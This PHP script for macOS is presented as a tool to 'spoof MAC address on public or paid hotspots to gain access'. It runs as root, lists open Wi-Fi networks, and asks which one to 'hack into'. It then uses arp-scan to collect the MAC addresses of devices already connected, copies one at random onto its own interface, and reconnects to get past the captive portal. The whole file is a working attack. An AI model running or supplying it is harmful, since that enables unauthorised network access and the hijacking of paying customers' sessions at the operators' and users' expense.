<?php

$macaddr_vendors = json_decode(file_get_contents("macaddr.json"),TRUE);

function is_connected()
{
    $connected = @fsockopen("www.google.com", 80); 
                                        //website, port  (try 80 or 443)
    if ($connected){
        $is_conn = true; //action when connected
        fclose($connected);
    }else{
        $is_conn = false; //action in connection failure
    }
    return $is_conn;

}

echo("|================================================================================|\n");
echo("|                                                                                |\n");
echo("|                                                                                |\n");
echo("|          SPOOF MAC Address on Public or Paid HotSpots to gain access           |\n");
echo("|                                                                                |\n");
echo("|                                                                                |\n");
echo("|================================================================================|\n\n");

if(shell_exec("whoami") != "root\n") {
	
	echo("|================================================================================|\n");
	echo("|          Please run this script as ROOT!                                       |\n");
	echo("|================================================================================|\n\n");
	
	exit;
	
}

$arpcheck = shell_exec("type arp-scan");

if(strpos($arpcheck,'arp-scan\n')) {
	
	echo("Please install arp-scan, this script heavily depend on it. [https://github.com/royhills/arp-scan]\n");
	
	echo("|================================================================================|\n");
	echo("|          Please install arp-scan, this script heavily depend on it.            |\n");
	echo("|                   [https://github.com/royhills/arp-scan]                       |\n");
	echo("|================================================================================|\n\n");
	
	exit;
	
}
	
$current_mac_addr = str_replace("\n","",shell_exec('ifconfig en0 ether | grep -Eo "[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"'));

	echo("|================================================================================|\n");
	echo("|          Saving your current MAC Address...                                    |\n");
	echo("|          ".$current_mac_addr."                                                     |\n");
	echo("|================================================================================|\n\n");
	
	
	echo("|================================================================================|\n");
	echo("|          Scanning for nearby HotSpots...                                       |\n");
	echo("|================================================================================|\n\n");
	
function signalquality($num) {
	
	switch ($num){

        case ($num>=0 && $num<=20): 
            return("๏๏๏๏๏");
        break;
        case ($num>=21 && $num<=40): 
            return("๏๏๏๏၀");
        break;
        case ($num>=41 && $num<=60): 
            return("๏๏๏၀၀");
        break;
        case ($num>=61 && $num<=80): 
            return("๏๏၀၀၀");
        break;
        case ($num>=81 && $num<=100): 
            return("๏၀၀၀၀");
        break;
        
        default: //default
            return("၀၀၀၀၀");
        break;
        
     }
     
}
     
$i = 1;
$hotspots_arr;

exec("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s | grep NONE | awk '{print $1\",\"$2\",\"$3}'",$available_hotspots);

$available_hotspots = array_unique($available_hotspots);
    
if(count($available_hotspots) > 0) {
	
	foreach($available_hotspots as $available_hotspot) {
		
		$hotspot_details = explode(",",$available_hotspot);
		
		$SSID = $hotspot_details[0];
		$BSSID = $hotspot_details[1];
		$signal_quality = signalquality(abs(intval($hotspot_details[2])));
		
		$hotspots_arr[$i] = array("SSID" => $SSID,"BSSID"=>$BSSID);
		
		echo("          ".$i." | ".$SSID." [".$BSSID."]		".$signal_quality."\n");
		
		$i++;
		
	}
	
	echo("\n|================================================================================|\n");
	
	echo("\n          Enter number of HotSpot to hack into: ");
    $handle = fopen ("php://stdin","r");
    $line = fgets($handle);
    
    echo("\n|================================================================================|\n\n");
	echo("          Trying to connect to ".$hotspots_arr[intval($line)]["SSID"]." [".$hotspots_arr[intval($line)]["BSSID"]."]...\n");
    
    exec("networksetup -setairportnetwork en0 '".$hotspots_arr[intval($line)]["SSID"]."'",$output);
    
    if(!strpos($output[0],'Could not')) {
	    
	    echo("          Connected to ".$hotspots_arr[intval($line)]["SSID"]." [".$hotspots_arr[intval($line)]["BSSID"]."]...\n\n");
	    
	    echo("|================================================================================|\n\n");
	    
	    
	    $routeraddr = shell_exec("ipconfig getpacket en0 | grep 'server_identifier (ip): ' | grep -Eo '[0-9.]{1,100}'");
	    $subnetmask = shell_exec("ipconfig getpacket en0 | grep 'subnet_mask (ip): ' | grep -Eo '[0-9.]{1,100}'");
	    
	    echo("          Waiting for IP address.");
	    
	    while ($routeraddr == "" || $subnetmask == "") {
		    
		    echo(".");
		    
		    $routeraddr = shell_exec("ipconfig getpacket en0 | grep 'server_identifier (ip): ' | grep -Eo '[0-9.]{1,100}'");
		    $subnetmask = shell_exec("ipconfig getpacket en0 | grep 'subnet_mask (ip): ' | grep -Eo '[0-9.]{1,100}'");
		    
		    flush();
		    
		    sleep(2);
		    
	    }
	    
	    echo("\n\n|================================================================================|\n\n");
	    
	    echo("          Scanning for MAC addresses nearby...\n");
	    
	    exec("arp-scan -q \"$(ipconfig getpacket en0 | grep 'server_identifier (ip): ' | grep -Eo '[0-9.]{1,100}')\":\"$(ipconfig getpacket en0 | grep 'subnet_mask (ip): ' | grep -Eo '[0-9.]{1,100}')\" | grep -Eo '[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}'",$macaddresses);
	    
	    $max = count($macaddresses)-1;
	    
	    $randmacaddr = $macaddresses[rand(0,$max)];
	    
	    echo("          Randomly selected some nice MAC address for you: ".$randmacaddr." device vendor: ".$macaddr_vendors[strtoupper(substr($randmacaddr,0,8))]."\n");
	    
	    exec("ifconfig en0 ether ".$randmacaddr);
	    
	    exec("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -z");
	    
	    exec('ifconfig en0 ether | grep -Eo "[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}"',$newmacaddr);
	    $newmacaddr = implode("\n",$newmacaddr);
	    
	    echo("\n|================================================================================|\n\n");
	    
	    if($newmacaddr != $current_mac_addr) {
		    
		    echo("          MAC Address changed successfully!\n");
		    
		    echo("          Trying to connect to ".$hotspots_arr[intval($line)]["SSID"]." [".$hotspots_arr[intval($line)]["BSSID"]."]...\n");
		    
		    exec("networksetup -setairportnetwork en0 '".$hotspots_arr[intval($line)]["SSID"]."'",$output2);
    
		    if(!strpos($output2[0],'Could not')) {
			    
			    echo("          Reconnected to ".$hotspots_arr[intval($line)]["SSID"]."\n");
			    
			    echo("          Checking internet availability.");
			    
			    while(!is_connected()) {
				    
				    echo(".");
				    
				    flush();
				    
				    sleep(15);
				    
			    }
			    
			    echo("\n          Internet is up and running! Enjoy!\n");
			    echo("\n|================================================================================|\n\n");
		    }
		    
		    
	    } else {
		    
		    echo("          Failed to change MAC Address!\n");
		    
	    }
	    
    } else {
	    
	    echo("          Failed to connect. Closing...\n");
	    
    }
    
    } else {
	    
	    echo("          No HotSpots found. Closing...\n");
	    
}
?>